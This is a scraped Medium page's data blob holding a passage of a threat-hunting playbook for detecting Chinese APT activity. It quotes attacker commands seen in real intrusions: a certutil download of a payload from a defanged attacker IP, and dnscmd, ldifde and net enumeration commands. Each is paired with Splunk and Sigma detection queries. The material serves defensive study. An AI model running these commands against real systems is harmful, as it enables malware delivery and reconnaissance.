riantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_monthly_plan","valueType":{"__typename":"VariantFlagString","value":"60e220181034"}},{"__typename":"VariantFlag","name":"enable_conversion_model_v2","valueType":{"__typename":"VariantFlagString","value":"group_2"}},{"__typename":"VariantFlag","name":"enable_diversification_rex","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_footer_app_buttons","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_stripe_customers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_integration","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_entities_to_follow_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"disable_partner_program_enrollment","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_apple_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_autorefresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_newsletter_lo_flow_custom_domains","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pill_based_home_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_iceland_forced_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_aspiriational","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier_badge","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_topic_portals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reader_fair_distribution_non_qp","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_new_push_notification_endpoint","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rito_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_automod","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_verified_book_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_in_app_free_trial","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_dynamic_aspirational_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_apple_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_creator_welcome_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recirc_model","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_lock_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_programming","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_country_expansion","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lo_homepage","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members_username_selection","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"coronavirus_topic_recirc","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_client","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_paypal","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_group_gifting","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_trust_service_recaptcha","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_updated_pub_recs_ui","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signup_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"android_two_hour_refresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_legacy_feed_in_iceland","valueType":{"__typename":"VariantFlagBoolean","value":true}}],"collectionByDomainOrSlug({\"domainOrSlug\":\"detect.fyi\"})":{"__ref":"Collection:d5fd8f494f6a"},"postResult({\"id\":\"379a6b950492\"})":{"__ref":"Post:379a6b950492"}},"ImageMetadata:1*ayMhoNccbO0IxQ1UPFv0SA.png":{"__typename":"ImageMetadata","id":"1*ayMhoNccbO0IxQ1UPFv0SA.png"},"Collection:d5fd8f494f6a":{"__typename":"Collection","id":"d5fd8f494f6a","favicon":{"__ref":"ImageMetadata:1*ayMhoNccbO0IxQ1UPFv0SA.png"},"customStyleSheet":null,"colorPalette":{"__typename":"ColorPalette","highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFEDF4F7","point":0},{"__typename":"ColorPoint","color":"#FFE9F3F6","point":0.1},{"__typename":"ColorPoint","color":"#FFE6F2F5","point":0.2},{"__typename":"ColorPoint","color":"#FFE2F0F4","point":0.3},{"__typename":"ColorPoint","color":"#FFDFEFF3","point":0.4},{"__typename":"ColorPoint","color":"#FFDBEDF2","point":0.5},{"__typename":"ColorPoint","color":"#FFD8ECF1","point":0.6},{"__typename":"ColorPoint","color":"#FFD4EAF1","point":0.7},{"__typename":"ColorPoint","color":"#FFD0E9F0","point":0.8},{"__typename":"ColorPoint","color":"#FFCCE8EF","point":0.9},{"__typename":"ColorPoint","color":"#FFC9E6EE","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF678C95","point":0},{"__typename":"ColorPoint","color":"#FF61828B","point":0.1},{"__typename":"ColorPoint","color":"#FF5A787F","point":0.2},{"__typename":"ColorPoint","color":"#FF546E74","point":0.3},{"__typename":"ColorPoint","color":"#FF4D6369","point":0.4},{"__typename":"ColorPoint","color":"#FF45585D","point":0.5},{"__typename":"ColorPoint","color":"#FF3D4D51","point":0.6},{"__typename":"ColorPoint","color":"#FF354145","point":0.7},{"__typename":"ColorPoint","color":"#FF2B3538","point":0.8},{"__typename":"ColorPoint","color":"#FF21292B","point":0.9},{"__typename":"ColorPoint","color":"#FF161B1C","point":1}]},"tintBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FF032E36","colorPoints":[{"__typename":"ColorPoint","color":"#FF032E36","point":0},{"__typename":"ColorPoint","color":"#FF294A51","point":0.1},{"__typename":"ColorPoint","color":"#FF45626A","point":0.2},{"__typename":"ColorPoint","color":"#FF5F7980","point":0.3},{"__typename":"ColorPoint","color":"#FF778F95","point":0.4},{"__typename":"ColorPoint","color":"#FF8FA3A9","point":0.5},{"__typename":"ColorPoint","color":"#FFA5B7BC","point":0.6},{"__typename":"ColorPoint","color":"#FFBBCACE","point":0.7},{"__typename":"ColorPoint","color":"#FFD1DDE0","point":0.8},{"__typename":"ColorPoint","color":"#FFE6EFF1","point":0.9},{"__typename":"ColorPoint","color":"#FFFBFFFF","point":1}]}},"domain":"detect.fyi","slug":"detect-fyi","googleAnalyticsId":null,"name":"Detect FYI","subscriberCount":1317,"description":"Threat Detection Engineering and DFIR Insights","avatar":{"__ref":"ImageMetadata:1*ayMhoNccbO0IxQ1UPFv0SA.png"},"latestPostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__ref":"Post:1b40810f8552"}]},"viewerEdge":{"__ref":"CollectionViewerEdge:collectionId:d5fd8f494f6a-viewerId:lo_a14f4be3b504"},"twitterUsername":null,"facebookPageId":null,"logo":{"__ref":"ImageMetadata:"}},"User:3d60ce83d2f7":{"__typename":"User","id":"3d60ce83d2f7","customDomainState":null,"hasSubdomain":false,"username":"simone.kraus","linkedAccounts":{"__ref":"LinkedAccounts:3d60ce83d2f7"},"isSuspended":false,"name":"SIMKRA","imageId":"1*BIfekvQdxa7JrHyPD8XJVw.png","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":564,"followingCount":178,"collectionFollowingCount":23},"bio":"","membership":{"__ref":"Membership:66a5397aa375"},"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:3d60ce83d2f7-viewerId:lo_a14f4be3b504"},"twitterScreenName":""},"Post:1b40810f8552":{"__typename":"Post","id":"1b40810f8552","firstPublishedAt":1735775190287,"creator":{"__ref":"User:3d60ce83d2f7"},"collection":{"__ref":"Collection:d5fd8f494f6a"},"isSeries":false,"mediumUrl":"https:\u002F\u002Fdetect.fyi\u002Fhunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552","sequence":null,"uniqueSlug":"hunting-svr-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally-1b40810f8552"},"MastodonAccount:simonekrausocd@me.dm":{"__typename":"MastodonAccount","domain":"me.dm","username":"simonekrausocd","id":"simonekrausocd@me.dm"},"LinkedAccounts:3d60ce83d2f7":{"__typename":"LinkedAccounts","mastodon":{"__ref":"MastodonAccount:simonekrausocd@me.dm"},"id":"3d60ce83d2f7"},"Membership:66a5397aa375":{"__typename":"Membership","tier":"MEMBER","id":"66a5397aa375"},"Paragraph:dcff7a17d5b3_0":{"__typename":"Paragraph","id":"dcff7a17d5b3_0","name":"7d3c","type":"H3","href":null,"layout":null,"metadata":null,"text":"Playbook Hunting Chinese APT","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_1":{"__typename":"Paragraph","id":"dcff7a17d5b3_1","name":"16b5","type":"H4","href":null,"layout":null,"metadata":null,"text":"Chinese APT TTPs and LOLBAS Operations","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_2":{"__typename":"Paragraph","id":"dcff7a17d5b3_2","name":"9b5a","type":"H4","href":null,"layout":null,"metadata":null,"text":"Discovery, lateral movement, and collection activities","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_3":{"__typename":"Paragraph","id":"dcff7a17d5b3_3","name":"ff44","type":"P","href":null,"layout":null,"metadata":null,"text":"This hunting guide is developed to find Chinese APT and other threat actors. Therefore, the Advisory AA23–144a, MITRE ATT&CK research and Cybersecurity Advisory on Chinese state-sponsored cyber operations: observed TTPs is used as a starting point to develop the hunting field manual.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_4":{"__typename":"Paragraph","id":"dcff7a17d5b3_4","name":"3cda","type":"H4","href":null,"layout":null,"metadata":null,"text":"certutil","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_5":{"__typename":"Paragraph","id":"dcff7a17d5b3_5","name":"1eb9","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we’ve observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":193,"end":245,"href":"https:\u002F\u002Fwww.mandiant.com\u002Fresources\u002Fgame-over-detecting-and-stopping-an-apt41-operation","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":436,"end":465,"href":"https:\u002F\u002Fwww.mandiant.com\u002Fcontent\u002Ffireeye-www\u002Fen_US\u002Fblog\u002Fthreat-research\u002F2019\u002F10\u002Flowkey-hunting-for-the-missing-volume-serial-id.html","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":193,"end":245,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":436,"end":465,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_6":{"__typename":"Paragraph","id":"dcff7a17d5b3_6","name":"1725","type":"PRE","href":null,"layout":null,"metadata":null,"text":"certutil -urlcache -split -f http:\u002F\u002F91.208.184[.]78\u002F2.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"perl"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_7":{"__typename":"Paragraph","id":"dcff7a17d5b3_7","name":"ec9e","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fnetwork_connection\u002Fnet_connection_win_certutil_initiated_connection.yml at…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":207,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fnetwork_connection\u002Fnet_connection_win_certutil_initiated_connection.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":95,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":96,"end":197,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fnetwork_connection\u002Fnet_connection_win_certutil_initiated_connection.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*rdeg-9QpgRWOmAiN"}},"Paragraph:dcff7a17d5b3_8":{"__typename":"Paragraph","id":"dcff7a17d5b3_8","name":"e020","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_9":{"__typename":"Paragraph","id":"dcff7a17d5b3_9","name":"71cb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (Image=”*\\\\certutil.exe” AND Initiated=”true” AND (DestinationPort=”80\" OR DestinationPort=”135\" OR DestinationPort=”443\" OR DestinationPort=”445\"))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"ini"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_10":{"__typename":"Paragraph","id":"dcff7a17d5b3_10","name":"ad20","type":"H4","href":null,"layout":null,"metadata":null,"text":"dnscmd","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_11":{"__typename":"Paragraph","id":"dcff7a17d5b3_11","name":"2eb3","type":"P","href":null,"layout":null,"metadata":null,"text":"Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_12":{"__typename":"Paragraph","id":"dcff7a17d5b3_12","name":"7713","type":"P","href":null,"layout":null,"metadata":null,"text":"The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_13":{"__typename":"Paragraph","id":"dcff7a17d5b3_13","name":"5919","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd . \u002Fenumrecords \u002Fzone {REDACTED}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_14":{"__typename":"Paragraph","id":"dcff7a17d5b3_14","name":"a567","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd . \u002Fenumzones","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_15":{"__typename":"Paragraph","id":"dcff7a17d5b3_15","name":"67cf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"dnscmd . \u002Fenumzones dnscmd \u002Fenumrecords {REDACTED} . \u002Fadditional","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_16":{"__typename":"Paragraph","id":"dcff7a17d5b3_16","name":"4ad3","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_17":{"__typename":"Paragraph","id":"dcff7a17d5b3_17","name":"26e2","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_18":{"__typename":"Paragraph","id":"dcff7a17d5b3_18","name":"20a2","type":"H4","href":null,"layout":null,"metadata":null,"text":"CAR Analytics LOLBAS with dnscmd","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_19":{"__typename":"Paragraph","id":"dcff7a17d5b3_19","name":"753c","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fcar.mitre.org\u002Fanalytics\u002FCAR-2020-05-003\u002F","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":48,"href":"https:\u002F\u002Fcar.mitre.org\u002Fanalytics\u002FCAR-2020-05-003\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_20":{"__typename":"Paragraph","id":"dcff7a17d5b3_20","name":"b4d5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=__your_sysmon_index__ EventCode=1 (OriginalFileName = At.exe OR OriginalFileName = Atbroker.exe OR OriginalFileName = Bash.exe OR OriginalFileName = Bitsadmin.exe OR OriginalFileName = Certutil.exe OR OriginalFileName = Cmd.exe OR OriginalFileName = Cmdkey.exe OR OriginalFileName = Cmstp.exe OR OriginalFileName = Control.exe OR OriginalFileName = Csc.exe OR OriginalFileName = Cscript.exe OR OriginalFileName = Dfsvc.exe OR OriginalFileName = Diskshadow.exe OR OriginalFileName = Dnscmd.exe OR OriginalFileName = Esentutl.exe OR OriginalFileName = Eventvwr.exe OR OriginalFileName = Expand.exe OR OriginalFileName = Extexport.exe OR OriginalFileName = Extrac32.exe OR OriginalFileName = Findstr.exe OR OriginalFileName = Forfiles.exe OR OriginalFileName = Ftp.exe OR OriginalFileName = Gpscript.exe OR OriginalFileName = Hh.exe OR OriginalFileName = Ie4uinit.exe OR OriginalFileName = Ieexec.exe OR OriginalFileName = Infdefaultinstall.exe OR OriginalFileName = Installutil.exe OR OriginalFileName = Jsc.exe OR OriginalFileName = Makecab.exe OR OriginalFileName = Mavinject.exe OR OriginalFileName = Microsoft.Workflow.r.exe OR OriginalFileName = Mmc.exe OR OriginalFileName = Msbuild.exe OR OriginalFileName = Msconfig.exe OR OriginalFileName = Msdt.exe OR OriginalFileName = Mshta.exe OR OriginalFileName = Msiexec.exe OR OriginalFileName = Odbcconf.exe OR OriginalFileName = Pcalua.exe OR OriginalFileName = Pcwrun.exe OR OriginalFileName = Presentationhost.exe OR OriginalFileName = Print.exe OR OriginalFileName = Reg.exe OR OriginalFileName = Regasm.exe OR OriginalFileName = Regedit.exe OR OriginalFileName = Register-cimprovider.exe OR OriginalFileName = Regsvcs.exe OR OriginalFileName = Regsvr32.exe OR OriginalFileName = Replace.exe OR OriginalFileName = Rpcping.exe OR OriginalFileName = Rundll32.exe OR OriginalFileName = Runonce.exe OR OriginalFileName = Runscripthelper.exe OR OriginalFileName = Sc.exe OR OriginalFileName = Schtasks.exe OR OriginalFileName = Scriptrunner.exe OR OriginalFileName = SyncAppvPublishingServer.exe OR OriginalFileName = Tttracer.exe OR OriginalFileName = Verclsid.exe OR OriginalFileName = Wab.exe OR OriginalFileName = Wmic.exe OR OriginalFileName = Wscript.exe OR OriginalFileName = Wsreset.exe OR OriginalFileName = Xwizard.exe OR OriginalFileName = Advpack.dll OR OriginalFileName = Comsvcs.dll OR OriginalFileName = Ieadvpack.dll OR OriginalFileName = Ieaframe.dll OR OriginalFileName = Mshtml.dll OR OriginalFileName = Pcwutl.dll OR OriginalFileName = Setupapi.dll OR OriginalFileName = Shdocvw.dll OR OriginalFileName = Shell32.dll OR OriginalFileName = Syssetup.dll OR OriginalFileName = Url.dll OR OriginalFileName = Zipfldr.dll OR OriginalFileName = Appvlp.exe OR OriginalFileName = Bginfo.exe OR OriginalFileName = Cdb.exe OR OriginalFileName = csi.exe OR OriginalFileName = Devtoolslauncher.exe OR OriginalFileName = dnx.exe OR OriginalFileName = Dxcap.exe OR OriginalFileName = Excel.exe OR OriginalFileName = Mftrace.exe OR OriginalFileName = Msdeploy.exe OR OriginalFileName = msxsl.exe OR OriginalFileName = Powerpnt.exe OR OriginalFileName = rcsi.exe OR OriginalFileName = Sqler.exe OR OriginalFileName = Sqlps.exe OR OriginalFileName = SQLToolsPS.exe OR OriginalFileName = Squirrel.exe OR OriginalFileName = te.exe OR OriginalFileName = Tracker.exe OR OriginalFileName = Update.exe OR OriginalFileName = vsjitdebugger.exe OR OriginalFileName = Winword.exe OR OriginalFileName = Wsl.exe OR OriginalFileName = CL_Mutexverifiers.ps1 OR OriginalFileName = CL_Invocation.ps1 OR OriginalFileName = Manage-bde.wsf OR OriginalFileName = Pubprn.vbs OR OriginalFileName = Slmgr.vbs OR OriginalFileName = Syncappvpublishingserver.vbs OR OriginalFileName = winrm.vbs OR OriginalFileName = Pester.bat)|eval CommandLine=lower(CommandLine)|eventstats count(process) as procCount by process|eventstats avg(procCount) as avg stdev(procCount) as stdev|eval lowerBound=(avg-stdev*1.5)|eval isOutlier=if((procCount \u003C lowerBound),1,0)|where isOutlier=1|table host, Image, ParentImage, CommandLine, ParentCommandLine, procCount","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_21":{"__typename":"Paragraph","id":"dcff7a17d5b3_21","name":"5767","type":"H4","href":null,"layout":null,"metadata":null,"text":"ldifde","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_22":{"__typename":"Paragraph","id":"dcff7a17d5b3_22","name":"c3ab","type":"P","href":null,"layout":null,"metadata":null,"text":"Enumeration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_23":{"__typename":"Paragraph","id":"dcff7a17d5b3_23","name":"8705","type":"PRE","href":null,"layout":null,"metadata":null,"text":"ldifde.exe -f c:\\windows\\temp\\.txt -p subtree","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_24":{"__typename":"Paragraph","id":"dcff7a17d5b3_24","name":"364e","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_25":{"__typename":"Paragraph","id":"dcff7a17d5b3_25","name":"b967","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_26":{"__typename":"Paragraph","id":"dcff7a17d5b3_26","name":"26c5","type":"H4","href":null,"layout":null,"metadata":null,"text":"net user\u002Fgroup\u002Fuse","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_27":{"__typename":"Paragraph","id":"dcff7a17d5b3_27","name":"1c95","type":"P","href":null,"layout":null,"metadata":null,"text":"Enumeration","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_28":{"__typename":"Paragraph","id":"dcff7a17d5b3_28","name":"4426","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net localgroup administrators","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_29":{"__typename":"Paragraph","id":"dcff7a17d5b3_29","name":"aa6d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"net group 